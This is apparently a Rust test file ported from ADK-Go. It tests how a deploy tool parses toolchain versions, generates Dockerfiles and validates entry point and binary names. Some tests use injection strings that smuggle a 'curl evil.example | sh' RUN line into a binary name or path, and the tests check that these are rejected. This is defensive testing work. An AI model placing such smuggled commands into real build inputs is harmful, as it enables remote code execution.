// Copyright 2026 Chris Olson
// Portions derived from ADK-Go (https://github.com/google/adk-go), Copyright 2026 Google LLC.
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

//! Port of ADK-Go `cmd/adkgo/internal/deploy/agentengine/agentengine_test.go`.
//!
//! Go's package global `flags` (and `resetFlags`, which swaps it) has no Rust counterpart:
//! every test drives its own receiver ([`reset_flags`]), so the receiver-not-global
//! assertions hold by construction. Go derives the executable name from a `main.go` path;
//! gadk resolves a Cargo package and binary through `cargo metadata` (R4), answered here by a
//! recording runner, so an unsafe "basename" is an unsafe binary name and "no `.go`
//! extension" is a package without a binary. The three Go-version tests are adapted to the
//! R5 chain (`rust-toolchain.toml` channel, `rust:<ver>-bookworm`).

use std::fs;

use gadk_platform::go_quote;
use pretty_assertions::assert_eq;

use crate::deploy::agentengine::tests::{dir_names, reset_flags, test_env, write_workspace};
use crate::deploy::agentengine::{AgentEngineFlags, command};
use crate::target::{
    CargoTarget, DEFAULT_BUILDER_RUST_VERSION, channel_from_toolchain_file, is_rust_version,
};
use crate::testutil::TestEnv;

/// Go `allowListRejection`: the part of `ValidateShellArgSafe`'s message no other validator
/// produces.
const ALLOW_LIST_REJECTION: &str =
    "whitespace splits COPY operands and shell metacharacters are live in a RUN line";

// parity: adapted: Go's go.mod `go` directive reader is gadk's `rust-toolchain.toml` `[toolchain] channel` reader (R5)
#[test]
fn test_go_version_from_mod_file() {
    let tests = [
        (
            "patch version",
            "[toolchain]\nchannel = \"1.95.1\"\n",
            "1.95.1",
        ),
        ("minor version", "[toolchain]\nchannel = \"1.95\"\n", "1.95"),
        (
            "ignores other sections",
            "[other]\nchannel = \"1.2.3\"\n\n[toolchain]\nchannel = \"1.95.1\"\n",
            "1.95.1",
        ),
        (
            "ignores components line",
            "[toolchain]\nchannel = \"1.95.1\"\ncomponents = [\"rustfmt\"]\n",
            "1.95.1",
        ),
        ("no channel", "[toolchain]\nprofile = \"minimal\"\n", ""),
        (
            "strips trailing line comment",
            "[toolchain]\nchannel = \"1.95.1\" # pinned by platform team\n",
            "1.95.1",
        ),
        (
            "rejects malformed version",
            "[toolchain]\nchannel = \"1abc\"\n",
            "",
        ),
        (
            "rejects a named channel",
            "[toolchain]\nchannel = \"stable\"\n",
            "",
        ),
    ];
    for (name, data, want) in tests {
        assert_eq!(channel_from_toolchain_file(data), want, "{name}");
    }
}

// parity: adapted: the builder image tracks rust-toolchain.toml (rust:<ver>-bookworm, no GOTOOLCHAIN); Go's global-vs-receiver setup has no Rust global
#[tokio::test]
async fn test_prepare_dockerfile_uses_go_mod_version() {
    let dir = tempfile::tempdir().unwrap();
    fs::write(
        dir.path().join("rust-toolchain.toml"),
        "[toolchain]\nchannel = \"1.95.1\"\n",
    )
    .unwrap();
    let dockerfile = dir.path().join("Dockerfile");
    let t = TestEnv::builder(dir.path()).build();

    let mut f = AgentEngineFlags::default();
    f.source.source_dir = dir.path().display().to_string();
    f.target = Some(CargoTarget {
        package: "my-agent".into(),
        bin: "agent".into(),
        workspace_root: dir.path().to_path_buf(),
        ..CargoTarget::default()
    });
    f.build.exec_file = "agent".into();
    f.build.dockerfile_build_path = dockerfile.display().to_string();
    // Deliberately not the 8080 default.
    f.agent_engine.server_port = 9091;

    f.prepare_dockerfile(&t.env).await.unwrap();

    let content = fs::read_to_string(&dockerfile).unwrap();
    assert!(
        content.contains("FROM rust:1.95.1-bookworm AS builder"),
        "Dockerfile does not use the rust-toolchain.toml version:\n{content}"
    );
    assert!(content.contains("\nEXPOSE 9091\n"), "{content}");
    assert!(
        content.contains("-p my-agent --bin agent\n"),
        "RUN line does not build the receiver's package and binary:\n{content}"
    );
    assert!(
        content.contains("\nCOPY --from=builder /gadk-target/release/agent  /app/agent\n"),
        "{content}"
    );
    assert!(content.contains(r#"["/app/agent", "web""#), "{content}");
    assert!(
        content.contains(r#"["/app/agent", "web", "-host", "0.0.0.0", "-port", "9091""#),
        "Dockerfile CMD must bind the web server to all interfaces with -host 0.0.0.0:\n{content}"
    );
}

// parity: adapted: gadk's rolling last-resort builder tag is DEFAULT_BUILDER_RUST_VERSION
#[test]
fn test_default_builder_go_version_is_not_pinned() {
    assert!(
        !is_rust_version(DEFAULT_BUILDER_RUST_VERSION),
        "DEFAULT_BUILDER_RUST_VERSION = {DEFAULT_BUILDER_RUST_VERSION:?} pins a version; use a rolling tag such as \"latest\""
    );
}

// parity: adapted: the unsafe executable name is a binary name from cargo metadata; -e is a benign package path
#[tokio::test]
async fn test_compute_flags_rejects_unsafe_entry_point_basename() {
    let dir = tempfile::tempdir().unwrap();
    write_workspace(dir.path());
    let entry_point = "cmd/quickstart";
    let t = test_env(
        dir.path(),
        dir.path(),
        "quickstart",
        &["main\"\nRUN curl evil.example | sh\n#"],
    );
    let mut f = reset_flags(entry_point, dir.path());

    let err = f.compute_flags(&t.env).await.unwrap_err();

    assert!(err.contains(ALLOW_LIST_REJECTION), "{err}");
    let want = format!("derived from --entry_point_path {}", go_quote(entry_point));
    assert!(err.contains(&want), "{err}");
}

// parity: adapted: -e names a package directory; the processed path resolves through cargo metadata
#[tokio::test]
async fn test_compute_flags_rejects_unsafe_orig_entry_point_path() {
    for (name, entry_point) in [
        (
            "metacharacters in a directory component",
            "a;curl evil.example|sh#/agent",
        ),
        // env.abs cleans the ".." away, so the processed path no longer contains "a;b",
        // while the value as typed still does.
        (
            "metacharacters cleaned out of the processed path",
            "./a;b/..",
        ),
    ] {
        let dir = tempfile::tempdir().unwrap();
        write_workspace(dir.path());
        let t = test_env(dir.path(), dir.path(), "agent", &["agent"]);
        let mut f = reset_flags(entry_point, dir.path());

        let err = f.compute_flags(&t.env).await.unwrap_err();

        assert!(err.contains(ALLOW_LIST_REJECTION), "{name}: {err}");
        let want = format!("--entry_point_path {}", go_quote(entry_point));
        assert!(err.contains(&want), "{name}: {err}");
        assert!(!err.contains("derived from"), "{name}: {err}");
    }
}

// parity: adapted: execFile is the package's binary name
#[tokio::test]
async fn test_compute_flags_accepts_benign_values() {
    let dir = tempfile::tempdir().unwrap();
    write_workspace(dir.path());
    let temp = tempfile::tempdir().unwrap();
    let t = test_env(dir.path(), dir.path(), "agent", &["main"]);
    let mut f = reset_flags("agent", temp.path());

    f.compute_flags(&t.env).await.unwrap();

    assert_eq!(f.build.exec_file, "main");
    for (name, p) in [
        ("dockerfile_build_path", &f.build.dockerfile_build_path),
        ("archive_path", &f.build.archive_path),
    ] {
        assert!(
            p.starts_with(&format!("{}/", f.build.temp_dir)),
            "{name} = {p:?}, want it inside the created temp dir {:?}",
            f.build.temp_dir
        );
    }
}

// parity: adapted: a non-ASCII package directory and binary name
#[tokio::test]
async fn test_compute_flags_accepts_non_ascii_entry_point() {
    let dir = tempfile::tempdir().unwrap();
    write_workspace(dir.path());
    let temp = tempfile::tempdir().unwrap();
    let t = test_env(dir.path(), dir.path(), "agente", &["agenté"]);
    let mut f = reset_flags("agentes/café", temp.path());

    f.compute_flags(&t.env).await.unwrap();

    assert_eq!(f.build.exec_file, "agenté");
}

// parity: adapted: "no .go extension" is a package without a binary target
#[tokio::test]
async fn test_compute_flags_rejection_leaves_no_temp_dir() {
    for (name, entry_point, bins) in [
        (
            "unsafe basename",
            "agent",
            vec!["main\"\nRUN curl evil.example | sh\n#"],
        ),
        (
            "unsafe directory",
            "a;curl evil.example|sh#/agent",
            vec!["agent"],
        ),
        ("package without a binary", "agent", vec![]),
    ] {
        let dir = tempfile::tempdir().unwrap();
        write_workspace(dir.path());
        let parent = tempfile::tempdir().unwrap();
        let t = test_env(dir.path(), dir.path(), "agent", &bins);
        let mut f = reset_flags(entry_point, parent.path());

        assert!(f.compute_flags(&t.env).await.is_err(), "{name}");
        assert_eq!(
            dir_names(parent.path()),
            Vec::<String>::new(),
            "{name}: rejected invocation left a temp dir behind"
        );
    }
}

// parity: adapted: the context spec is protojson (memoryBankConfig.generationConfig.model, ttlConfig.defaultTtl)
#[tokio::test]
async fn test_memory_bank_context_spec_generation_model() {
    let default_model = command()
        .get_arguments()
        .find(|a| a.get_id() == "mem_model")
        .map(|a| {
            a.get_default_values()
                .iter()
                .map(|v| v.to_string_lossy().into_owned())
                .collect::<String>()
        })
        .unwrap();
    let tests = [
        (
            "default leaves the model to Memory Bank",
            default_model.as_str(),
            "",
        ),
        (
            "explicit model is prefixed with project and region",
            "publishers/google/models/some-model",
            "projects/my-project/locations/us-central1/publishers/google/models/some-model",
        ),
    ];
    for (name, mem_model, want_model) in tests {
        let dir = tempfile::tempdir().unwrap();
        write_workspace(dir.path());
        let temp = tempfile::tempdir().unwrap();
        let t = test_env(dir.path(), dir.path(), "agent", &["agent"]);
        let mut f = reset_flags("agent", temp.path());
        f.gcloud.project_name = "my-project".into();
        f.gcloud.region = "us-central1".into();
        f.agent_engine.memory_bank.model = mem_model.into();
        f.agent_engine.memory_bank.ttl = gadk_platform::GoDuration(24 * 3600 * 1_000_000_000);

        f.compute_flags(&t.env).await.unwrap();
        let spec = f.memory_bank_context_spec();
        let cfg = &spec["memoryBankConfig"];

        if want_model.is_empty() {
            assert_eq!(
                cfg.get("generationConfig"),
                None,
                "{name}: GenerationConfig must be unset so Memory Bank uses its default model"
            );
        } else {
            assert_eq!(cfg["generationConfig"]["model"], want_model, "{name}");
        }
        assert_eq!(cfg["ttlConfig"]["defaultTtl"], "86400s", "{name}");
    }
}

// parity: adapted: the RUN line builds the resolved package and binary (`-p <package> --bin <execFile>`)
#[tokio::test]
async fn test_prepare_dockerfile_entry_point_reaches_run_line() {
    let dir = tempfile::tempdir().unwrap();
    write_workspace(dir.path());
    let temp = tempfile::tempdir().unwrap();
    let t = test_env(dir.path(), dir.path(), "quickstart", &["quickstart"]);
    let mut f = reset_flags("cmd/quickstart", temp.path());
    f.agent_engine.server_port = 8080;

    f.compute_flags(&t.env).await.unwrap();
    f.prepare_dockerfile(&t.env).await.unwrap();

    let content = fs::read_to_string(&f.build.dockerfile_build_path).unwrap();
    let run_line = content
        .lines()
        .rev()
        .find_map(|l| l.strip_prefix("RUN "))
        .unwrap_or_else(|| panic!("no RUN instruction in the generated Dockerfile:\n{content}"));
    let want = format!("-p quickstart --bin {}", f.build.exec_file);
    assert!(
        run_line.ends_with(&want),
        "RUN line = {run_line:?}, want it to end with {want:?}"
    );
}
